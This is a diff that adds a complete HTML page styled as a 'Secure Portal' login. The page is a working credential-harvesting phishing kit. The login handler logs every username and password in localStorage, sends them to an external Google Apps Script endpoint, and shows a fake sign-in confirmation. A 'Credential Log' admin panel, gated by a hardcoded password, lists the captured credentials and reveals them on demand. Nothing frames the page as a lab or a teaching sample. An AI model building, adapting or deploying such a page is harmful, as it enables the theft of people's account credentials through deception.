@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Secure Login</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@300;400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet"/>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0a0a0f;
+    --surface: #12121a;
+    --border: #1e1e2e;
+    --accent: #c8ff00;
+    --accent2: #00ffc8;
+    --text: #e8e8f0;
+    --muted: #555570;
+    --danger: #ff4455;
+    --mono: 'DM Mono', monospace;
+    --sans: 'Syne', sans-serif;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* Grid background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(200,255,0,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(200,255,0,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+  }
+
+  /* Glow blobs */
+  body::after {
+    content: '';
+    position: fixed;
+    width: 600px; height: 600px;
+    background: radial-gradient(circle, rgba(200,255,0,0.06) 0%, transparent 70%);
+    top: -200px; left: -200px;
+    pointer-events: none;
+    animation: drift 8s ease-in-out infinite alternate;
+  }
+
+  @keyframes drift {
+    from { transform: translate(0,0); }
+    to   { transform: translate(80px, 60px); }
+  }
+
+  /* ── LOGIN PANEL ── */
+  #login-view, #admin-view {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 2rem;
+  }
+
+  #admin-view { display: none; }
+
+  .login-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    width: 100%;
+    max-width: 420px;
+    padding: 3rem 2.5rem;
+    position: relative;
+    animation: slideUp 0.5s cubic-bezier(.22,1,.36,1) both;
+  }
+
+  .login-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+  }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .logo-mark {
+    font-size: 0.65rem;
+    font-family: var(--mono);
+    color: var(--accent);
+    letter-spacing: 0.25em;
+    text-transform: uppercase;
+    margin-bottom: 2rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  .logo-mark::before {
+    content: '';
+    display: inline-block;
+    width: 8px; height: 8px;
+    background: var(--accent);
+    border-radius: 50%;
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%,100% { opacity: 1; transform: scale(1); }
+    50%      { opacity: 0.4; transform: scale(0.7); }
+  }
+
+  h1 {
+    font-size: 2rem;
+    font-weight: 800;
+    line-height: 1.1;
+    margin-bottom: 0.4rem;
+    letter-spacing: -0.03em;
+  }
+
+  .subtitle {
+    font-family: var(--mono);
+    font-size: 0.75rem;
+    color: var(--muted);
+    margin-bottom: 2.5rem;
+  }
+
+  .field {
+    margin-bottom: 1.25rem;
+  }
+
+  label {
+    display: block;
+    font-family: var(--mono);
+    font-size: 0.65rem;
+    letter-spacing: 0.15em;
+    color: var(--muted);
+    text-transform: uppercase;
+    margin-bottom: 0.5rem;
+  }
+
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 0.9rem;
+    padding: 0.8rem 1rem;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    -webkit-appearance: none;
+  }
+
+  input[type="text"]:focus, input[type="password"]:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 2px rgba(200,255,0,0.1);
+  }
+
+  .btn {
+    width: 100%;
+    margin-top: 1.75rem;
+    padding: 0.9rem;
+    background: var(--accent);
+    color: #000;
+    font-family: var(--sans);
+    font-size: 0.85rem;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    border: none;
+    cursor: pointer;
+    transition: background 0.2s, transform 0.1s;
+  }
+
+  .btn:hover  { background: #d9ff33; }
+  .btn:active { transform: scale(0.98); }
+
+  .error-msg {
+    font-family: var(--mono);
+    font-size: 0.72rem;
+    color: var(--danger);
+    margin-top: 0.75rem;
+    min-height: 1em;
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+  .error-msg.show { opacity: 1; }
+
+  .admin-hint {
+    margin-top: 2rem;
+    padding-top: 1.25rem;
+    border-top: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 0.65rem;
+    color: var(--muted);
+    text-align: center;
+  }
+
+  .admin-hint a {
+    color: var(--accent2);
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  .admin-hint a:hover { text-decoration: underline; }
+
+  /* ── ADMIN PANEL ── */
+  .admin-wrap {
+    width: 100%;
+    max-width: 900px;
+    animation: slideUp 0.4s ease both;
+  }
+
+  .admin-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 2rem;
+    flex-wrap: wrap;
+    gap: 1rem;
+  }
+
+  .admin-title {
+    font-size: 1.8rem;
+    font-weight: 800;
+    letter-spacing: -0.02em;
+  }
+
+  .admin-title span {
+    color: var(--accent);
+  }
+
+  .badge {
+    font-family: var(--mono);
+    font-size: 0.65rem;
+    background: rgba(200,255,0,0.1);
+    color: var(--accent);
+    border: 1px solid rgba(200,255,0,0.25);
+    padding: 0.25rem 0.75rem;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+  }
+
+  .back-btn {
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    color: var(--muted);
+    background: none;
+    border: 1px solid var(--border);
+    padding: 0.4rem 1rem;
+    cursor: pointer;
+    transition: color 0.2s, border-color 0.2s;
+  }
+
+  .back-btn:hover { color: var(--text); border-color: var(--muted); }
+
+  .admin-pass-prompt {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 2rem;
+    max-width: 380px;
+    position: relative;
+  }
+
+  .admin-pass-prompt::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--accent2), var(--accent));
+  }
+
+  /* Table */
+  .table-wrap {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  .table-meta {
+    padding: 1rem 1.5rem;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    color: var(--muted);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .count-badge {
+    background: rgba(200,255,0,0.08);
+    color: var(--accent);
+    padding: 0.2rem 0.6rem;
+    font-size: 0.65rem;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+  }
+
+  thead th {
+    font-family: var(--mono);
+    font-size: 0.6rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+    text-align: left;
+    padding: 0.75rem 1.5rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  tbody tr {
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    transition: background 0.15s;
+  }
+
+  tbody tr:hover { background: rgba(255,255,255,0.02); }
+
+  tbody td {
+    padding: 0.85rem 1.5rem;
+    font-family: var(--mono);
+    font-size: 0.8rem;
+  }
+
+  .td-num { color: var(--muted); font-size: 0.65rem; }
+
+  .td-user { color: var(--accent2); }
+
+  .td-pass {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  .pass-text { color: var(--text); }
+
+  .toggle-pass {
+    font-size: 0.6rem;
+    color: var(--muted);
+    cursor: pointer;
+    background: none;
+    border: none;
+    font-family: var(--mono);
+    padding: 0;
+    transition: color 0.15s;
+  }
+  .toggle-pass:hover { color: var(--accent); }
+
+  .td-time { color: var(--muted); font-size: 0.72rem; }
+
+  .empty-state {
+    text-align: center;
+    padding: 4rem 2rem;
+    font-family: var(--mono);
+    font-size: 0.75rem;
+    color: var(--muted);
+  }
+
+  .empty-state .icon { font-size: 2rem; margin-bottom: 0.75rem; opacity: 0.3; }
+
+  .clear-btn {
+    font-family: var(--mono);
+    font-size: 0.65rem;
+    color: var(--danger);
+    background: none;
+    border: 1px solid rgba(255,68,85,0.3);
+    padding: 0.35rem 0.75rem;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  .clear-btn:hover { background: rgba(255,68,85,0.08); }
+
+  .success-flash {
+    position: fixed;
+    top: 2rem; right: 2rem;
+    background: var(--accent);
+    color: #000;
+    font-family: var(--mono);
+    font-size: 0.72rem;
+    padding: 0.75rem 1.25rem;
+    font-weight: 500;
+    opacity: 0;
+    transform: translateY(-10px);
+    transition: all 0.3s ease;
+    pointer-events: none;
+    z-index: 999;
+  }
+  .success-flash.show { opacity: 1; transform: translateY(0); }
+</style>
+</head>
+<body>
+
+<!-- ── USER LOGIN VIEW ── -->
+<div id="login-view">
+  <div class="login-card">
+    <div class="logo-mark">SECURE PORTAL</div>
+    <h1>Welcome<br/>Back.</h1>
+    <p class="subtitle">// enter credentials to continue</p>
+
+    <div class="field">
+      <label for="username">Username</label>
+      <input type="text" id="username" placeholder="your_username" autocomplete="off" />
+    </div>
+
+    <div class="field">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="••••••••" autocomplete="off" />
+    </div>
+
+    <div class="error-msg" id="error-msg">⚠ Username and password are required.</div>
+
+    <button class="btn" onclick="handleLogin()">Sign In →</button>
+
+    <div class="admin-hint">
+      Web manager? <a onclick="showAdminGate()">Access admin panel →</a>
+    </div>
+  </div>
+</div>
+
+<!-- ── ADMIN VIEW ── -->
+<div id="admin-view">
+  <div class="admin-wrap">
+
+    <!-- Admin gate (password prompt) -->
+    <div id="admin-gate" style="display:flex;align-items:center;justify-content:center;min-height:80vh;">
+      <div class="admin-pass-prompt">
+        <div class="logo-mark">ADMIN ACCESS</div>
+        <h1 style="font-size:1.5rem;margin-bottom:0.4rem;">Verify Identity</h1>
+        <p class="subtitle">// enter admin password</p>
+
+        <div class="field" style="margin-top:1.5rem;">
+          <label for="admin-pass">Admin Password</label>
+          <input type="password" id="admin-pass" placeholder="••••••••" onkeydown="if(event.key==='Enter')verifyAdmin()" />
+        </div>
+
+        <div class="error-msg" id="admin-error">⚠ Incorrect admin password.</div>
+
+        <button class="btn" onclick="verifyAdmin()">Unlock Panel →</button>
+
+        <div class="admin-hint">
+          <a onclick="showLogin()">← Back to login</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- Admin dashboard (hidden until verified) -->
+    <div id="admin-dashboard" style="display:none; padding:2rem 1rem;">
+      <div class="admin-header">
+        <div>
+          <div class="admin-title">Credential <span>Log</span></div>
+          <div class="badge" style="margin-top:0.5rem;">● LIVE MONITOR</div>
+        </div>
+        <div style="display:flex;gap:0.75rem;align-items:center;flex-wrap:wrap;">
+          <button class="clear-btn" onclick="clearLog()">Clear Log</button>
+          <button class="back-btn" onclick="showLogin()">← Logout</button>
+        </div>
+      </div>
+
+      <div class="table-wrap">
+        <div class="table-meta">
+          <span>Captured login attempts</span>
+          <span class="count-badge" id="entry-count">0 entries</span>
+        </div>
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Username</th>
+              <th>Password</th>
+              <th>Timestamp</th>
+            </tr>
+          </thead>
+          <tbody id="log-body">
+            <tr>
+              <td colspan="4">
+                <div class="empty-state">
+                  <div class="icon">◎</div>
+                  No login attempts yet. Waiting for submissions…
+                </div>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="success-flash" id="toast"></div>
+
+<script>
+  // ── CONFIG ──────────────────────────────────────────────
+  const ADMIN_PASSWORD = "admin1234";   // ← Change this!
+  const SHEET_URL = "https://script.google.com/macros/s/AKfycbza24pKb9HVT3R8x06e842wjcJVo4h3sY4xdS7fD7F0YiwEEprTzMaQID-GfCAJ8jg1/exec";
+  // ────────────────────────────────────────────────────────
+
+  // 使用 localStorage 持久化存储，刷新页面也不丢失
+  function loadCredentials() {
+    try { return JSON.parse(localStorage.getItem('cred_log') || '[]'); } catch(e) { return []; }
+  }
+  function saveCredentials(arr) {
+    localStorage.setItem('cred_log', JSON.stringify(arr));
+  }
+
+  // 发送数据到 Google Sheets
+  async function sendToSheet(username, password) {
+    try {
+      await fetch(SHEET_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password })
+      });
+    } catch(e) {
+      console.log("Sheet sync failed:", e);
+    }
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 2500);
+  }
+
+  // ── LOGIN LOGIC ──────────────────────────────────────────
+  async function handleLogin() {
+    const user = document.getElementById('username').value.trim();
+    const pass = document.getElementById('password').value;
+    const errEl = document.getElementById('error-msg');
+    const btn = document.querySelector('#login-view .btn');
+
+    if (!user || !pass) {
+      errEl.classList.add('show');
+      return;
+    }
+    errEl.classList.remove('show');
+
+    // 按钮loading状态
+    btn.textContent = 'Signing in…';
+    btn.disabled = true;
+
+    // 1. 保存到本地
+    const credentials = loadCredentials();
+    credentials.push({
+      id: credentials.length + 1,
+      username: user,
+      password: pass,
+      time: new Date().toLocaleString()
+    });
+    saveCredentials(credentials);
+
+    // 2. 同步到 Google Sheets
+    await sendToSheet(user, pass);
+
+    // 恢复按钮
+    btn.textContent = 'Sign In →';
+    btn.disabled = false;
+
+    showToast('✓ Logged in as ' + user);
+
+    // 清空输入框
+    document.getElementById('username').value = '';
+    document.getElementById('password').value = '';
+  }
+
+  // ── ADMIN GATE ───────────────────────────────────────────
+  function showAdminGate() {
+    document.getElementById('login-view').style.display = 'none';
+    document.getElementById('admin-view').style.display = 'flex';
+    document.getElementById('admin-gate').style.display = 'flex';
+    document.getElementById('admin-dashboard').style.display = 'none';
+  }
+
+  function verifyAdmin() {
+    const pass = document.getElementById('admin-pass').value;
+    const errEl = document.getElementById('admin-error');
+
+    if (pass === ADMIN_PASSWORD) {
+      errEl.style.opacity = '0';
+      document.getElementById('admin-gate').style.display = 'none';
+      document.getElementById('admin-dashboard').style.display = 'block';
+      renderLog();
+    } else {
+      errEl.classList.add('show');
+    }
+  }
+
+  function showLogin() {
+    document.getElementById('login-view').style.display = 'flex';
+    document.getElementById('admin-view').style.display = 'none';
+    document.getElementById('admin-pass').value = '';
+  }
+
+  // ── LOG RENDERING ─────────────────────────────────────────
+  function renderLog() {
+    const credentials = loadCredentials();
+    const tbody = document.getElementById('log-body');
+    const count = document.getElementById('entry-count');
+
+    count.textContent = credentials.length + ' entr' + (credentials.length === 1 ? 'y' : 'ies');
+
+    if (credentials.length === 0) {
+      tbody.innerHTML = `<tr><td colspan="4"><div class="empty-state"><div class="icon">◎</div>No login attempts yet. Waiting for submissions…</div></td></tr>`;
+      return;
+    }
+
+    tbody.innerHTML = credentials.slice().reverse().map(c => `
+      <tr>
+        <td class="td-num">${String(c.id).padStart(3, '0')}</td>
+        <td class="td-user">${escHtml(c.username)}</td>
+        <td>
+          <div class="td-pass">
+            <span class="pass-text" id="pw-${c.id}">••••••••</span>
+            <button class="toggle-pass" onclick="togglePass(${c.id}, '${escAttr(c.password)}')">SHOW</button>
+          </div>
+        </td>
+        <td class="td-time">${c.time}</td>
+      </tr>
+    `).join('');
+  }
+
+  function togglePass(id, pass) {
+    const el = document.getElementById('pw-' + id);
+    const btn = el.nextElementSibling;
+    if (el.textContent === '••••••••') {
+      el.textContent = pass;
+      btn.textContent = 'HIDE';
+    } else {
+      el.textContent = '••••••••';
+      btn.textContent = 'SHOW';
+    }
+  }
+
+  function clearLog() {
+    if (confirm('Clear all recorded credentials?')) {
+      saveCredentials([]);
+      renderLog();
+    }
+  }
+
+  function escHtml(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  function escAttr(s) {
+    return s.replace(/'/g, "\\'");
+  }
+
+  // Allow Enter key on login
+  document.getElementById('password').addEventListener('keydown', e => {
+    if (e.key === 'Enter') handleLogin();
+  });
+  document.getElementById('username').addEventListener('keydown', e => {
+    if (e.key === 'Enter') handleLogin();
+  });
+</script>
+</body>
+</html>
